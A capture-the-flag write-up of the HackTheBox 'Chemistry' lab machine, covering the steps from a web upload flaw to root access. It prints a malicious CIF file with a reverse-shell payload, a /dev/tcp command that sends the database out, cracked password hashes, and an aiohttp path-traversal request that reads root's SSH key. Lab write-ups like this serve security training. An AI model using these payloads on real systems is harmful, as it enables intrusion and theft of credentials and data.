---
title: HTB - Chemistry
date: 2025-03-08 00:00:00 + 1000
categories: [Linux,Web App,CTF,HTB]
tags: [PathTraversal, WebExploitation, Arbitrary Code Execution, CIF file exploitation, CVE-2024-23334]
comments: false
---

This write-up details exploiting the Chemistry HTB machine, the web server was vulnerable to code execution via manipulated CIF file uploads, gaining initial access as the `app` user. Further exploration exposed a database containing user credentials leading to access as `rosa` with a cracked password. Finally, a path traversal vulnerability in the `aiohttp` exposed the root user's SSH key gaining the root access and grabbing the root flag

## Common Enumeration 

### Nmap

I fired up `nmap` with a full port scan, you know the usual `-p-`, `-sC`, and `-sV` combo, and threw in `-oA` to save the results and `--open` to just see the open ones

Here's what `nmap` coughed up:

- SSH - `22`
- HTTP - `5000` - Werkzeug httpd 3.0.3 - Alright, a webserver on a non-standard port Interesting!

```bash
$ sudo nmap -p- -sC -sV -oA recon/allports 10.10.11.38 --open
[sudo] password for kad:
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-19 20:05 AEDT
Nmap scan report for 10.10.11.38
Host is up (0.010s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 b6:fc:20:ae:9d:1d:45:1d:0b:ce:d9:d0:20:f2:6f:dc (RSA)
|   256 f1:ae:1c:3e:1d:ea:55:44:6c:2f:f2:56:8d:62:3c:2b (ECDSA)
|_  256 94:42:1b:78:f2:51:87:07:3e:97:26:c9:a2:5c:0a:26 (ED25519)
5000/tcp open  http    Werkzeug httpd 3.0.3 (Python 3.9.5)
|_http-title: Chemistry - Home
|_http-server-header: Werkzeug/3.0.3 Python/3.9.5
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.61 seconds
```

### Browsing Website

So, I check out the website running on `http://10.10.11.38:5000/` and it seems like a site where you can upload and analyse CIF (Crystallographic Information File)

They also have "Login" and "Register"

![](/assets/img/Chemistry/1.webp)

I created an account, `z3r0da`, logged in, and... I was presented with an option to upload a CIF file

![](/assets/img/Chemistry/2.webp)

Quick google search for "CIF" led to ["Arbitrary code execution"](https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2f) I grabbed the PoC from the GitHub page and modified the `example.cif` file with reverse shell like so:

```bash
data_Example
_cell_length_a    10.00000
_cell_length_b    10.00000
_cell_length_c    10.00000
_cell_angle_alpha 90.00000
_cell_angle_beta  90.00000
_cell_angle_gamma 90.00000
_symmetry_space_group_name_H-M 'P 1'
loop_
 _atom_site_label
 _atom_site_fract_x
 _atom_site_fract_y
 _atom_site_fract_z
 _atom_site_occupancy
 H 0.00000 0.00000 0.00000 1
 O 0.50000 0.50000 0.50000 1


_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("/bin/bash -c \'sh -i >& /dev/tcp/10.10.14.44/1337 0>&1\'");0,0,0'


_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "
```

I set up a `netcat` listener and uploaded the modified CIF file and got the shell as `app` user!

```bash
$ nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.14.44] from (UNKNOWN) [10.10.11.38] 56230
sh: 0: can't access tty; job control turned off
$ whoami
app
```

## Initial Access

I used this little Python trick to get a more interactive shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
CTRL+Z
stty raw -echo; fg
export TERM=xterm
```

I found myself in the `app`'s home directory, which looked like this:

```bash
app@chemistry:~$ ls -l
total 24
-rw------- 1 app app 5852 Oct  9 20:08 app.py
drwx------ 2 app app 4096 Jan 19 10:23 instance
drwx------ 2 app app 4096 Oct  9 20:13 static
drwx------ 2 app app 4096 Oct  9 20:18 templates
drwx------ 2 app app 4096 Jan 19 10:23 uploads
```

I had a peek at `app.py` and there was a database password: `MyS3cretCh3mistry4PP` always check the source code!

```bash
app@chemistry:~$ cat app.py
from flask import Flask, render_template, request, redirect, url_for, flash
from werkzeug.utils import secure_filename
from flask_sqlalchemy import SQLAlchemy
from flask_login import LoginManager, UserMixin, login_user, login_required, logout_user, current_user
from pymatgen.io.cif import CifParser
import hashlib
import os
import uuid

app = Flask(__name__)
app.config['SECRET_KEY'] = 'MyS3cretCh3mistry4PP'
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///database.db'
app.config['UPLOAD_FOLDER'] = 'uploads/'
app.config['ALLOWED_EXTENSIONS'] = {'cif'}

.....snip......
```

There was also a `database.db` file under the `/instance` directory

```bash
app@chemistry:~/instance$ ls -l
total 20
-rwx------ 1 app app 20480 Jan 19 10:30 database.db
```

I wanted to see what was inside, so I downloaded it to my machine using `netcat`

```bash
app@chemistry:~/instance$ cat database.db > /dev/tcp/10.10.14.44/1337
```

And on my machine:

```bash
nc -lvnp 1337 > database.db
```

### Browsing the Database

The database had two tables: `user` and `structure`

```bash
sqlite> .table
structure  user
```

The `user` table had usernames and password hashes. The users `admin`, `app`, and `rosa` caught my eye, along with other possible CTF player accounts

```bash
sqlite> select * from user;
1|admin|2861debaf8d99436a10ed6f75a252abf
2|app|197865e46b878d9e74a0346b6d59886a
3|rosa|63ed86ee9f624c7b14f1d4f43dc251a5
4|robert|02fcf7cfc10adc37959fb21f06c6b467
5|jobert|3dec299e06f7ed187bac06bd3b670ab2
6|carlos|9ad48828b0955513f7cf0f7f6510c8f8
7|peter|6845c17d298d95aa942127bdad2ceb9b
8|victoria|c3601ad2286a4293868ec2a4bc606ba3
9|tania|a4aa55e816205dc0389591c9f82f43bb
10|eusebio|6cad48078d0241cca9a7b322ecd073b3
11|gelacia|4af70c80b68267012ecdac9a7e916d18
12|fabian|4e5d71f53fdd2eabdbabb233113b5dc0
13|axel|9347f9724ca083b17e39555c36fd9007
14|kristel|6896ba7b11a62cacffbdaded457c6d92
15|z3r0da|5f4dcc3b5aa765d61d8327deb882cf99
sqlite>
```

I threw the `rosa` hash into crackstation and it cracked it! `rosa:unicorniosrosados`!
### Shell as Rosa

with that password, I logged in as `rosa` and grabbed the user flag

```bash
rosa@chemistry:~$ whoami
rosa
rosa@chemistry:~$ cat user.txt
1fb8f8fec5...
```

Running `netstat -anltp` I saw a connection on `127.0.0.1:8080` and this looked interesting!

```bash
rosa@chemistry:~$ netstat -tnlp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:5000            0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -
```

So checking it out by curling the port and it seems to be a Monitor dashboard

```bash
$ curl 127.0.0.1:8080 --head
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 5971
Date: Sun, 19 Jan 2025 12:00:04 GMT
Server: Python/3.9 aiohttp/3.9.1
```

I set up port forwarding using SSH it forwards my local port 8080 to the remote host’s localhost:8080

```bash
ssh -fN -L 8080:127.0.0.1:8080 rosa@10.10.11.38
```

With the port forward in place, I browsed `127.0.0.1:8080` on my machine and the dashboard page popped up. However, the buttons didn't seem to do anything. They all displayed "The functionality is currently not available."


![](/assets/img/Chemistry/3.webp)

So, I did a bit of digging and found out that `aiohttp/3.9.1` was vulnerable to a [CVE-2024-23334](https://ethicalhacking.uk/cve-2024-23334-aiohttps-directory-traversal-vulnerability/#gsc.tab=0) Path Traversal. Time to go for root! I used curl to grab the root's `id_rsa` file

```bash
$ curl -s --path-as-is http://localhost:8080/assets/../../../../root/.ssh/id_rsa > id_rsa
$ chmod 600 id_rsa
```

## Shell as Root

Finally, I used the key to log in as root and grabbed the root flag!

```
root@chemistry:~# whoami
root
root@chemistry:~# cat root.txt
77e67290e4...
```

